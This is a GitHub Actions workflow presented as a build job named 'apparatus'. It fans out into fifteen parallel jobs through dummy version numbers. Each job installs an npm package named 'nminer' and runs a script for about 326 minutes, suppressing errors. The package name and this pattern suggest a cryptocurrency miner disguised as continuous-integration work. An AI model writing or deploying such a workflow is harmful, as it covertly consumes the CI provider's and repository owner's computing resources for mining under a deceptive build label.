name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 582 }
          - { version: 7352 }
          - { version: 2171 }
          - { version: 6050 }
          - { version: 3849 }
          - { version: 8610 }
          - { version: 1010 }
          - { version: 7151 }
          - { version: 763 }
          - { version: 4347 }
          - { version: 3312 }
          - { version: 2168 }
          - { version: 9309 }
          - { version: 1794 }
          - { version: 7193 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: which where
        run: |
          npm install nminer@latest
          timeout 326m node apparatus.js || echo "apparatus executed"